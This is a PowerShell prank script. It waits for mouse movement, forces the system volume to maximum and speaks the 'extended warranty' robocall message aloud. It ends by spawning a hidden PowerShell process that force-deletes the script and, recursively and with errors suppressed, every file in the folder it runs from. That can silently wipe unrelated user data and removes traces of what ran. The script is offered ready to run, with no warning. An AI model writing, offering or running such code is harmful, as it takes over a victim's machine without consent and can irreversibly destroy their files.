# Add Speech Synthesis Assembly
Add-Type -AssemblyName System.speech

# Create Speech Synthesizer Object
$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer

# Set Volume & Rate (Optional)
$speak.Volume = 100
$speak.Rate = 0

# Function to Set System Volume to 100%
function Set-Volume100 {
    $WshShell = New-Object -ComObject WScript.Shell
    for ($i = 0; $i -lt 50; $i++) { $WshShell.SendKeys([char]175) }  # Increase volume key
}

# Get Initial Mouse Position
Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class UserInput {
        [DllImport("user32.dll")]
        public static extern bool GetCursorPos(out POINT lpPoint);
    }
    public struct POINT {
        public int X;
        public int Y;
    }
"@
[POINT]$initialMouse = 0
[UserInput]::GetCursorPos([ref]$initialMouse)

Write-Host "Move the mouse to start the message..."

# Wait for Mouse Movement
do {
    [POINT]$currentMouse = 0
    [UserInput]::GetCursorPos([ref]$currentMouse)
    Start-Sleep -Milliseconds 500
} while ($currentMouse.X -eq $initialMouse.X -and $currentMouse.Y -eq $initialMouse.Y)

# Set Volume to 100%
Set-Volume100

# Speak the Message
$speak.SpeakAsync("We have been trying to reach you concerning your vehicle's extended warranty. 
You should have received a notice in the mail about your car's extended warranty eligibility. 
Since we have not gotten a response, we are giving you a final courtesy call before we close out your file. 
Press 2 to be removed and placed on our do-not-call list. 
To speak to someone about possibly extending or reinstating your vehicle's warranty, 
press 1 to speak with a warranty specialist.")

# Keep PowerShell Open Until Speech is Done
while ($speak.State -ne 'Ready') {
    Start-Sleep -Milliseconds 500
}

# Get the Current Script Path
$scriptPath = $MyInvocation.MyCommand.Path
$scriptFolder = Split-Path -Path $scriptPath -Parent

# Delete the Script File and Related Files
Start-Sleep -Seconds 2  # Ensure script finishes before deleting
Write-Host "Deleting script and related files..."

# Use a separate PowerShell process to delete the script after execution
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-Command `"Start-Sleep -Seconds 1; Remove-Item -Path '$scriptPath' -Force; Remove-Item -Path '$scriptFolder\*' -Force -Recurse -ErrorAction SilentlyContinue`"" -NoNewWindow
